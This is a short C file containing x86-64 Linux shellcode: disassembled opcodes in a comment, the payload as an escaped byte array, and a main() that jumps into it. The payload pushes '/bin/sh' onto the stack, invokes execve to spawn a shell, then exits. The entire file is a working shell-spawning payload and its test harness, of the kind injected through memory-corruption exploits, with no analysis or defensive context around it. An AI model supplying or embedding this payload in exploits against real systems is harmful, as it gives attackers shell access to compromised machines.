/*
Opcode:

48 31 d2                  xor       %rdx,%rdx
48 bb ff 2f 62 69 6e      movabs    $0x68732f6e69622fff,%rbx
2f 73 68
48 c1 eb 08               shr       $0x8,%rbx
53                        push      %rbx
48 89 e7                  mov       %rsp,%rdi
48 31 c0                  xor       %rax,%rax
50                        push      %rax
57                        push      %rdi
48 89 e6                  mov       %rsp,%rsi
b0 3b                     mov       $0x3b,%al
0f 05                     syscall
6a 01                     pushq     $0x1
5f                        pop       %rdi
6a 3c                     pushq     $0x3c
58                        pop       %rax
0f 05                     syscall
*/

const char shellcode[] =
    "\x48\x31\xd2\x48\xbb\xff\x2f\x62\x69\x6e\x2f\x73\x68"
    "\x48\xc1\xeb\x08\x53\x48\x89\xe7\x48\x31\xc0\x50\x57"
    "\x48\x89\xe6\xb0\x3b\x0f\x05\x6a\x01\x5f\x6a\x3c\x58"
    "\x0f\x05";

int
main () {
    __asm__("jmp shellcode");
    return 0;
}
